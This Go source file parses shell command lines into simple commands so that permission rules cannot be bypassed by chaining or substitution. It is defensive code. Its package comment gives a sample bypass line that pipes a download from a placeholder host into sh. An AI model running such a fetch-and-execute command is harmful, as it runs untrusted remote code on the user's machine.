// Package shellparse splits a shell command line into the simple commands it
// runs, so that a permission rule is compared with each command and not with
// the whole line.
//
// A rule such as "git *" written as a text pattern also matches
// "git status; curl http://host/x | sh", because "*" matches ";", "|" and
// "$(...)". The command line has to be taken apart first. This is not a shell
// parser: it knows quotes, escapes, the separators and the constructs that run
// something else (substitutions, redirections, groups), and when it is unsure
// it says so through Unsafe, which callers treat as "not covered by an allow
// rule".
package shellparse

import "strings"

// maxDepth bounds the nesting of command substitutions that are looked into.
const maxDepth = 8

// Analysis is what a command line is made of.
type Analysis struct {
	// Segments are the simple commands, in order, including the ones inside
	// command substitutions, backticks and process substitutions.
	Segments []string
	// Unsafe is true when the line contains something an allow rule must not
	// cover: a command or process substitution, an output redirection, a here
	// document, a subshell or group, an unterminated quote, or a nesting that is
	// too deep to follow.
	Unsafe bool
}

// Analyze splits command into its simple commands.
func Analyze(command string) Analysis {
	segments, unsafe := analyze([]rune(command), 0)
	return Analysis{Segments: segments, Unsafe: unsafe}
}

func analyze(src []rune, depth int) ([]string, bool) {
	if depth > maxDepth {
		return nil, true
	}
	p := &parser{src: src, depth: depth}
	p.run()
	return p.segments, p.unsafe
}

// parser reads one command line, character by character.
type parser struct {
	src      []rune
	i        int
	depth    int
	cur      strings.Builder
	segments []string
	unsafe   bool
	quote    rune // 0, '\'' or '"'
}

func (p *parser) run() {
	for p.i < len(p.src) {
		c := p.src[p.i]
		switch p.quote {
		case '\'':
			p.inSingleQuote(c)
		case '"':
			p.inDoubleQuote(c)
		default:
			p.unquoted(c)
		}
	}
	if p.quote != 0 {
		p.unsafe = true
	}
	p.flush()
}

// peek returns the character after the current one, or 0.
func (p *parser) peek() rune {
	if p.i+1 < len(p.src) {
		return p.src[p.i+1]
	}
	return 0
}

// write copies the current character into the segment being read.
func (p *parser) write(c rune) {
	p.cur.WriteRune(c)
	p.i++
}

// flush ends the segment being read.
func (p *parser) flush() {
	if s := strings.TrimSpace(p.cur.String()); s != "" {
		p.segments = append(p.segments, s)
	}
	p.cur.Reset()
}

// substitution reads what a command or process substitution runs, given its
// inside and the index of its closing character, and moves the parser
// past it. The line is unsafe because of the substitution itself, whatever its
// inside holds.
func (p *parser) substitution(inner []rune, end int) {
	p.unsafe = true
	segments, _ := analyze(inner, p.depth+1)
	p.segments = append(p.segments, segments...)
	p.i = end + 1
}

func (p *parser) parenSubstitution(open int) {
	inner, end := parenInner(p.src, open)
	p.substitution(inner, end)
}

func (p *parser) backtickSubstitution() {
	inner, end := backtickInner(p.src, p.i)
	p.substitution(inner, end)
}

func (p *parser) inSingleQuote(c rune) {
	if c == '\'' {
		p.quote = 0
	}
	p.write(c)
}

func (p *parser) inDoubleQuote(c rune) {
	switch {
	case c == '\\' && p.i+1 < len(p.src):
		p.cur.WriteRune(c)
		p.cur.WriteRune(p.src[p.i+1])
		p.i += 2
	case c == '"':
		p.quote = 0
		p.write(c)
	case c == '$' && p.peek() == '(':
		p.parenSubstitution(p.i + 1)
	case c == '`':
		p.backtickSubstitution()
	default:
		p.write(c)
	}
}

func (p *parser) unquoted(c rune) {
	switch c {
	case '\\':
		p.escape(c)
	case '\'', '"':
		p.quote = c
		p.write(c)
	case '#':
		p.hash(c)
	case '\n', ';':
		p.flush()
		p.i++
	case '&':
		p.ampersand(c)
	case '|':
		p.pipe()
	case '$':
		p.dollar(c)
	case '`':
		p.backtickSubstitution()
	case '>':
		p.greater(c)
	case '<':
		p.less(c)
	case '(', ')':
		p.unsafe = true // a subshell, a group or an arithmetic expression
		p.flush()
		p.i++
	case '{':
		if strings.TrimSpace(p.cur.String()) == "" {
			p.unsafe = true // a command group
		}
		p.write(c)
	default:
		p.write(c)
	}
}

func (p *parser) escape(c rune) {
	p.cur.WriteRune(c)
	if p.i+1 < len(p.src) {
		p.cur.WriteRune(p.src[p.i+1])
		p.i++
	}
	p.i++
}

// hash starts a comment at the beginning of a word; inside a word it is text.
func (p *parser) hash(c rune) {
	if !startsWord(p.cur.String()) {
		p.write(c)
		return
	}
	for p.i < len(p.src) && p.src[p.i] != '\n' {
		p.i++
	}
}

func (p *parser) ampersand(c rune) {
	switch {
	case p.peek() == '&':
		p.flush()
		p.i += 2
	case strings.HasSuffix(p.cur.String(), ">") || strings.HasSuffix(p.cur.String(), "<"):
		p.write(c) // a descriptor duplication such as 2>&1
	default:
		p.flush() // a command sent to the background
		p.i++
	}
}

func (p *parser) pipe() {
	p.flush()
	p.i++
	if next := p.peekCurrent(); next == '|' || next == '&' {
		p.i++
	}
}

// peekCurrent returns the current character, or 0 at the end of the line.
func (p *parser) peekCurrent() rune {
	if p.i < len(p.src) {
		return p.src[p.i]
	}
	return 0
}

func (p *parser) dollar(c rune) {
	if p.peek() == '(' {
		p.parenSubstitution(p.i + 1)
		return
	}
	p.write(c)
}

func (p *parser) greater(c rune) {
	p.unsafe = true // an output redirection writes wherever it points
	if p.peek() == '(' {
		p.parenSubstitution(p.i + 1)
		return
	}
	p.write(c)
}

func (p *parser) less(c rune) {
	switch p.peek() {
	case '(':
		p.parenSubstitution(p.i + 1)
	case '<':
		p.unsafe = true // a here document or here string
		p.cur.WriteString("<<")
		p.i += 2
	default:
		p.write(c) // an input redirection reads, it does not run anything
	}
}

// startsWord reports whether the next character begins a shell word: at the
// start of the line or after a blank.
func startsWord(s string) bool {
	return s == "" || strings.HasSuffix(s, " ") || strings.HasSuffix(s, "\t")
}

// parenInner returns what is between the parenthesis at src[open] and its
// closing one, and the index of that closing parenthesis (len(src)-1 when it is
// missing, so that the rest of the line is taken as the inside).
func parenInner(src []rune, open int) (inner []rune, end int) {
	depth := 0
	var quote rune
	for i := open; i < len(src); i++ {
		c := src[i]
		if quote != 0 {
			if c == '\\' && quote == '"' {
				i++
			} else if c == quote {
				quote = 0
			}
			continue
		}
		switch c {
		case '\\':
			i++
		case '\'', '"':
			quote = c
		case '(':
			depth++
		case ')':
			depth--
			if depth == 0 {
				return src[open+1 : i], i
			}
		}
	}
	return src[open+1:], len(src) - 1
}

// backtickInner returns what is between the backtick at src[open] and the next
// one that is not escaped, and the index of that closing backtick.
func backtickInner(src []rune, open int) (inner []rune, end int) {
	for i := open + 1; i < len(src); i++ {
		switch src[i] {
		case '\\':
			i++
		case '`':
			return src[open+1 : i], i
		}
	}
	return src[open+1:], len(src) - 1
}

// MatchesAllow reports whether an allow rule covers command: every simple
// command the line runs must match, and the line must hold nothing that runs
// something else or writes somewhere (see Analysis.Unsafe). A line equal to the
// rule itself is covered, since the user approved exactly that text.
func MatchesAllow(command string, matches func(candidate string) bool, exactRule bool) bool {
	command = strings.TrimSpace(command)
	if command == "" {
		return false
	}
	if exactRule {
		return matches(command)
	}
	analysis := Analyze(command)
	if analysis.Unsafe || len(analysis.Segments) == 0 {
		return false
	}
	for _, segment := range analysis.Segments {
		if !matches(segment) {
			return false
		}
	}
	return true
}

// MatchesRestriction reports whether a deny or an ask rule applies to command:
// it does as soon as the whole line or any simple command it runs matches, so
// that "rm *" is still caught in "ls; rm x" and in "echo $(rm x)".
func MatchesRestriction(command string, matches func(candidate string) bool) bool {
	command = strings.TrimSpace(command)
	if command == "" {
		return false
	}
	if matches(command) {
		return true
	}
	for _, segment := range Analyze(command).Segments {
		if matches(segment) {
			return true
		}
	}
	return false
}
